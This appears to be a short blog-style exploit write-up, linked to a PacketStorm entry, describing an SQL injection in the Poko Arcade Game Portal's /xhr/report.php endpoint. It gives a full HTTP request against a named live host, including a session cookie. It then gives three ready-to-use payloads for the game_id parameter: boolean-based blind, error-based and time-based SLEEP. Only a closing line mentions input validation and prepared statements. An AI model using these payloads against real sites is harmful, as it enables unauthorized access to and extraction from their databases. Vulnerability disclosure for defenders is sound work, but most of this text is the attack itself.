Here's the exploit code
[PacketStorm Poko Arcade Game Portal SQL Injection](https://packetstorm.news/files/id/189587/)

<h2>SQL Injection Chronicles: Breaking into the Poko Arcade Game Portal</h2>

<h3>Intro</h3>
What’s better than beating the high score in an arcade game? Hacking the website itself! In a recent vulnerability hunt, I stumbled upon a juicy SQL Injection (SQLi) flaw in the Poko Arcade Game Portal. Let’s break it down.


<h2>Exploitation:</h2>
Digging deeper, I crafted some requests and tested various payloads to assess the vulnerability.

<h3>Request</h3>
```
POST /xhr/report.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Accept: */*
x-requested-with: XMLHttpRequest
Cookie: PHPSESSID=77ugk4bmujg32iur8vtthovpu2
Content-Length: 328
Accept-Encoding: gzip,deflate,br
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
Host: poko.mvnstore.in
Connection: Keep-alive

game_id=1&game_name=Barbies%20Sketch&problem=e
```
<h2>Parameter & Payloads</h2>

Parameter: game_id (POST)

Boolean-based blind payload:

```
game_id=(SELECT (CASE WHEN (5478=5478) THEN 1 ELSE (SELECT 5855 UNION SELECT 3253) END))&game_name=Barbies Sketch&problem=e
```
Error-based payload:

```
game_id=1 AND EXTRACTVALUE(6033,CONCAT(0x5c,0x7171627a71,(SELECT (ELT(6033=6033,1))),0x716a766b71))&game_name=Barbies Sketch&problem=e
```
Time-Based blind payload:

```
game_id=1 AND (SELECT 8414 FROM (SELECT(SLEEP(5)))DwLw)&game_name=Barbies Sketch&problem=e
```

SQL Injection vulnerabilities are still out there, lurking in poorly secured web apps. It’s a reminder that input validation and prepared statements are critical, unless you enjoy watching your arcade turn into a hacker’s playground.

Patch fast, play safe!
